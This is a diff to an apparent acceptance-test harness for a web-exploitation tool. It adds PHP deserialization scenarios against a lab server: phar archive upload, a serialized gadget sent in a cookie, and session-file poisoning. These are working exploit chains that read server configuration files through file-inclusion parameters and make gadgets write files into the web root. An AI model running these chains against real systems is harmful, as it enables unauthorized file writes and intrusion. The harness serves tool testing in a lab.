@@ -25,6 +25,7 @@ import argparse
 import base64
 import os
 import re
+import secrets
 import subprocess
 import sys
 import time
@@ -44,10 +45,16 @@ HOSTNAME_IN_APP = None  # filled in by the baseline, since it changes per contai
 
 
 class Result:
-    def __init__(self, name: str, url: str, args: list[str]):
+    def __init__(self, name: str, url: str, args: list[str], must: str = ""):
         self.name = name
         self.url = url
         self.args = args
+        # When set, the run has to show this and nothing else will do. A page
+        # that also has a readable parameter answers the general "did it find
+        # something" check with the read, which has nothing to do with what the
+        # scenario is about - so a scenario whose whole point is one kind of
+        # evidence has to name that evidence.
+        self.must = must
         self.hand: bool | None = None
         self.hand_note = ""
         self.tool = False
@@ -147,14 +154,23 @@ def run_tool(args: list[str], timeout: int = 300) -> tuple[int, str]:
 def tool_found(output: str) -> bool:
     """Whether the run got what it went for, in any of the shapes that count.
 
-    Three, because the tool reports a result three ways: a fact with `proven` set,
-    a finding block that prints the payload that worked, and - for the shell
-    routes - the command's own output, which is the strongest evidence of the
-    three and the one this check originally missed.
+    Four, because the tool reports a result four ways: a fact with `proven` set, a
+    finding block that prints the payload that worked, a command's own output -
+    which is the strongest evidence of the three - and a gadget's side effect,
+    which is a file the target served back rather than anything the tool says
+    about itself.
+
+    The gadget case has to name the side effect and not just the fact. A page
+    with a readable parameter also sets `proven`, and the archive scenario's URL
+    has one; matching on that alone would pass the deserialization scenario on
+    the strength of a file read that has nothing to do with it. What is being
+    checked is that a file appeared where the gadget was asked to write it.
     """
     if re.search(r"^\[\+\] .*(proven = True|command execution confirmed)", output, re.M):
         return True
-    if re.search(r"^\s+payload:", output, re.M):
+    if re.search(r"^\[\+\] .*the gadget ran:", output, re.M):
+        return True
+    if re.search(r"^\s+payload:", output, re.M | re.I):
         return True
     # A command that ran leaves its own mark: the passwd line, the uid line, the
     # architecture line. These are outputs, not the word "success".
@@ -162,7 +178,7 @@ def tool_found(output: str) -> bool:
         return True
     if re.search(r"^\[-\] (probe|exploit)\.\w+: (raised|service refused)", output, re.M):
         return False
-    return bool(re.search(r"^\s+payload:", output, re.M))
+    return False
 
 
 # ------------------------------------------------------------------ the catalog
@@ -173,6 +189,9 @@ SCENARIOS: list[tuple[str, str, str]] = [
     ("lfi", "wrapper-base64", "php://filter source disclosure"),
     ("shell", "filter-chain", "code execution through a php://filter chain"),
     ("shell", "log-poisoning", "code execution through a file the server writes"),
+    ("deserialize", "phar-gadget", "a gadget deserialized from an uploaded archive"),
+    ("deserialize", "unserialize-gadget", "a gadget deserialized from a value in the request"),
+    ("deserialize", "session-file", "the session file reached through an include"),
     ("ssrf", "internal-service", "an internal service only the application can reach"),
     ("ssrf", "metadata", "the cloud metadata address"),
     ("ssrf", "address-spelling", "a spelling the signature filter does not know"),
@@ -417,11 +436,306 @@ def hand_log_poison(base: str, log_path: str, marker: str) -> tuple[bool, str]:
     return False, "the log came back without the planted code in it"
 
 
+def hand_phar(base: str) -> tuple[bool, str]:
+    """Run the archive chain by hand and see whether the gadget leaves a file.
+
+    The steps are the chain: work out where the application is served from, build
+    an archive whose metadata is the lab's gadget aimed at a file under that
+    directory, upload it, point the parameter that opens archives at it, and fetch
+    the file back.
+
+    The archive itself is built with the tool's builder - reimplementing the phar
+    container here would be a second thing to be wrong, and it is not what this
+    is checking. Everything about the chain is done here.
+
+    The web root is read the way the tool reads it, from the server's own
+    configuration, because the write has to land in a directory that is served.
+    That is not an assumption: a relative path was measured not to work, since
+    PHP resolves it against a working directory that is not the one it serves.
+    """
+    sys.path.insert(0, ROOT)
+    from injectorkit.core import phar  # noqa: PLC0415
+
+    # 1. what does the server say it serves?
+    status, config = fetch(
+        f"{base}?read={urllib.parse.quote('/etc/apache2/sites-enabled/000-default.conf', safe='')}"
+    )
+    match = re.search(r"DocumentRoot\s+(\S+)", config)
+    if not match:
+        return False, "the server's configuration did not say which directory it serves"
+    webroot = match.group(1)
+
+    # 2. an archive whose metadata is the gadget, aimed at a name under it
+    name = "ikaccept-" + secrets.token_hex(6) + ".txt"
+    marker = "ikaccept" + secrets.token_hex(8)
+    written = f"{webroot}/uploads/{name}"
+    metadata = phar.php_object("Cache", {"path": written, "key": marker})
+    archive = phar.build(files=[("index.php", b"<?php echo 1;")], metadata=metadata)
+
+    # 3. upload it, the way a browser posts a file
+    uploaded = upload_to_lab(f"http://{HOST}:8080/upload.php", archive, "accept.phar")
+    if not uploaded:
+        return False, "the upload endpoint did not take the archive"
+
+    # 4. point the parameter that opens archives at it
+    status, body = fetch(f"{base}?config={urllib.parse.quote(uploaded, safe='')}")
+    if "metadata is a Cache" not in body:
+        return False, f"the application did not deserialise it: {body.strip()[:120]}"
+
+    # 5. did the gadget leave the file where it was asked to?
+    url = f"http://{HOST}:8080/uploads/{name}"
+    status, body = fetch(url)
+    if marker in body:
+        return True, f"the gadget wrote {url}, which serves the marker {marker}"
+    return False, f"the application deserialised the archive but {url} answers {status}"
+
+
+def upload_to_lab(endpoint: str, content: bytes, filename: str, field: str = "file") -> str:
+    """POST one file as multipart, and return the path the reply named.
+
+    Returns "" when the reply names nothing, which is a real answer: an upload
+    endpoint that does not say where the file went leaves the chain without a
+    path, and guessing one is how a working chain gets reported as broken.
+    """
+    boundary = "----ikaccept" + secrets.token_hex(8)
+    body = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
+        f"Content-Type: application/x-php\r\n\r\n"
+    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
+
+    request = urllib.request.Request(
+        endpoint,
+        data=body,
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+    )
+    try:
+        with urllib.request.urlopen(request, timeout=20) as response:
+            text = response.read().decode("latin-1", "replace")
+    except Exception:  # noqa: BLE001
+        return ""
+
+    match = re.search(r"(uploads/[A-Za-z0-9_.-]+)", text)
+    return match.group(1) if match else ""
+
+
+def lab_webroot() -> str:
+    """What the server says it serves, read through whichever endpoint will say it.
+
+    Used by the hand side of the chains that write a file, because the write has
+    to land in a directory the server serves and a relative path does not work.
+    """
+    for path in ("/etc/apache2/sites-enabled/000-default.conf", "/etc/nginx/sites-enabled/default"):
+        _, body = fetch(f"http://{HOST}:8080/include.php?file={urllib.parse.quote(path, safe='')}")
+        match = re.search(r"(?:DocumentRoot|root)\s+(\S+)", body)
+        if match:
+            return match.group(1).rstrip(";")
+    return ""
+
+
+def hand_unserialize() -> tuple[bool, str]:
+    """Send a serialized gadget as a cookie and see whether it leaves a file.
+
+    No archive, no upload, no second request: the value itself goes to the
+    parameter and the application hands it to `unserialize()`. The gadget is the
+    same one the archive chain uses, which is the point - delivery differs, the
+    object does not.
+    """
+    sys.path.insert(0, ROOT)
+    from injectorkit.core import phar  # noqa: PLC0415
+
+    webroot = lab_webroot()
+    if not webroot:
+        return False, "the server's configuration did not say which directory it serves"
+
+    name = "ikaccept-" + secrets.token_hex(6) + ".txt"
+    marker = "ikaccept" + secrets.token_hex(8)
+    written = f"{webroot}/uploads/{name}"
+    payload = phar.php_object("Cache", {"path": written, "key": marker}).decode("utf-8", "replace")
+
+    request = urllib.request.Request(
+        f"http://{HOST}:8080/prefs.php",
+        headers={"Cookie": f"prefs={urllib.parse.quote(payload, safe='')}"},
+    )
+    try:
+        with urllib.request.urlopen(request, timeout=20) as response:
+            body = response.read().decode("latin-1", "replace")
+    except Exception as error:  # noqa: BLE001
+        return False, f"the request failed: {error}"
+
+    url = f"http://{HOST}:8080/uploads/{name}"
+    status, served = fetch(url)
+    if marker in served:
+        return True, f"the gadget wrote {url}; the page said {body.strip()[:60]!r}"
+    return False, f"the page said {body.strip()[:80]!r} and {url} answers {status}"
+
+
+def hand_session() -> tuple[bool, str]:
+    """Run the session loop by hand and see whether a gadget comes out of it.
+
+    The whole chain, in the order it has to happen: the session file is found by
+    reading it, a serialized object is put into it, the application is asked to
+    read the session, and the file the object was told to write is fetched back.
+
+    The object goes in through the only write the lab offers - a gadget that
+    writes a file, aimed at the session path. That is the interesting part of the
+    shape: the value written has to survive whatever the writer puts around it,
+    and the `php` handler splits on `|`, so a name and a pipe are enough.
+    """
+    sys.path.insert(0, ROOT)
+    from injectorkit.core import phar  # noqa: PLC0415
+
+    webroot = lab_webroot()
+    if not webroot:
+        return False, "the server's configuration did not say which directory it serves"
+
+    ident = "ikacceptsess" + secrets.token_hex(4)
+    cookie = {"Cookie": f"PHPSESSID={ident}"}
+    loader = f"http://{HOST}:8080/config.php"
+
+    # 1. the session exists once something has started one
+    fetch(f"{loader}?config=x", headers=cookie)
+    session_file = f"/var/lib/php/sessions/sess_{ident}"
+    status, body = fetch(
+        f"{loader}?read={urllib.parse.quote(session_file, safe='')}", headers=cookie
+    )
+    # Both wordings: the loader says it has no such config, and an include says it
+    # could not open the stream. Checking only the second let a first request that
+    # never created the file pass here and fail three steps later, where the
+    # message pointed at the payload rather than at the session.
+    if "failed to open stream" in body or "no such snippet" in body or "no such config" in body:
+        return False, f"{session_file} was not readable after a request that should have made it"
+
+    # 2. an object for the session, aimed at a file the server serves
+    name = "ikacceptsess-" + secrets.token_hex(6) + ".txt"
+    marker = "ikaccept" + secrets.token_hex(8)
+    written = f"{webroot}/uploads/{name}"
+    inner = phar.php_object("Cache", {"path": written, "key": marker}).decode("utf-8", "replace")
+
+    # 3. and a writer aimed at the session file, carrying it behind a pipe
+    outer = phar.php_object("Cache", {"path": session_file, "key": "ik|" + inner})
+    archive = phar.build(files=[("index.php", b"<?php echo 1;")], metadata=outer)
+    uploaded = upload_to_lab(f"http://{HOST}:8080/upload.php", archive, "sess.phar")
+    if not uploaded:
+        return False, "the upload endpoint did not take the archive"
+
+    fetch(f"{loader}?config={urllib.parse.quote(uploaded, safe='')}", headers=cookie)
+
+    # 4. let the application read its own session, which builds the object.
+    #
+    # Nothing in between. PHP removes a session file it cannot decode, and a
+    # writer that leaves anything after the last pair - a newline, say, which is
+    # what a `file_put_contents` format usually ends with - makes the data
+    # undecodable. So a read here is not a harmless check: it is the request that
+    # deletes the file, and if this step is inserted before the trigger, the
+    # trigger has nothing left to decode. That is what made this hand side fail
+    # while the tool, which never read it back, succeeded.
+    fetch(f"{loader}?read={urllib.parse.quote('/etc/hostname', safe='')}", headers=cookie)
+
+    url = f"http://{HOST}:8080/uploads/{name}"
+    status, served = fetch(url)
+    if marker in served:
+        return True, f"the session file built the object and it wrote {url}"
+    return False, f"nothing was served from {url} (status {status})"
+
+
+def scenario_deserialize(name: str) -> Result:
+    """A gadget deserialized out of an archive the run put there itself."""
+    if name == "session-file":
+        url = f"http://{HOST}:8080/config.php?config=index.phar&read=index.php"
+        result = Result(
+            name,
+            url,
+            [
+                "proto",
+                "-u",
+                url,
+                "-C",
+                "PHPSESSID=ikaccept-session",
+                "--exploit",
+                "--max-requests",
+                "900",
+                "--upload-to",
+                f"http://{HOST}:8080/upload.php",
+                "--phar-class",
+                "Cache",
+                "--phar-set",
+                "path={session}",
+                "--phar-set",
+                "key={payload}",
+            ],
+            # The evidence, and only it: the session file has to have been
+            # readable, and the object built from what was written into it has to
+            # have run. Either alone is a weaker claim than the chain.
+            must=r"\[\+\] the session file at .* is readable through[\s\S]*\[\+\] .*the gadget ran:",
+        )
+        result.hand, result.hand_note = hand_session()
+        return result
+
+    if name == "unserialize-gadget":
+        url = f"http://{HOST}:8080/prefs.php"
+        # This endpoint has one parameter and it feeds `unserialize()`, so nothing
+        # on it can read the server's configuration and the web root cannot be
+        # worked out from here. The operator names it, which is what the override
+        # is for - and what a person would do, having read it off the same box.
+        # The archive scenario is where the inference itself is exercised.
+        webroot = lab_webroot()
+        result = Result(
+            name,
+            url,
+            [
+                "proto",
+                "-u",
+                url,
+                "-C",
+                "prefs=index",
+                "--exploit",
+                "--webroot",
+                webroot,
+                "--phar-class",
+                "Cache",
+                "--phar-set",
+                "path={file}",
+                "--phar-set",
+                "key={marker}",
+            ],
+            must=r"^\s*\[\+\] .*the gadget ran:",
+        )
+        result.hand, result.hand_note = hand_unserialize()
+        return result
+
+    base = f"http://{HOST}:8080/config.php"
+    url = f"{base}?config=index.phar&read=index.php"
+    result = Result(
+        name,
+        url,
+        [
+            "proto",
+            "-u",
+            url,
+            "--exploit",
+            "--upload-to",
+            f"http://{HOST}:8080/upload.php",
+            "--phar-class",
+            "Cache",
+            "--phar-set",
+            "path={file}",
+            "--phar-set",
+            "key={marker}",
+        ],
+        must=r"^\s*\[\+\] .*the gadget ran:",
+    )
+    result.hand, result.hand_note = hand_phar(base)
+    return result
+
+
 def build(group: str, name: str) -> Result:
     if group == "lfi":
         return scenario_lfi(name)
     if group == "shell":
         return scenario_shell(name)
+    if group == "deserialize":
+        return scenario_deserialize(name)
     if group == "ssrf":
         return scenario_ssrf(name)
     return scenario_waf(name)
@@ -494,6 +808,8 @@ def main() -> int:
         else:
             code, output = run_tool(result.args)
             result.tool = tool_found(output)
+            if result.must:
+                result.tool = bool(re.search(result.must, output, re.M))
             result.tool_note = "found" if result.tool else f"nothing (exit {code})"
 
         results.append(result)
